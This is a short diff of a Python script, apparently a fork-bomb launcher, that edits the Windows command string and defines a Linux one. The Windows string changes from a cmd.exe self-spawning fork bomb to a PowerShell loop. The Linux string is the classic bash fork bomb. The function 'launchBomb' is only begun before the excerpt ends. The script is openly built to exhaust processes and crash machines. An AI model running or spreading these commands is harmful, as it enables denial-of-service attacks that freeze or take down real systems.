@@ -1,7 +1,7 @@
 #!/bin/env python3
 import os
 
-win = "cmd.exe /c %0|%0"
+win = "powershell -c for(){hh \}"
 lin = "bash -c ':(){ :|: & };:'"
 
 def launchBomb(con):
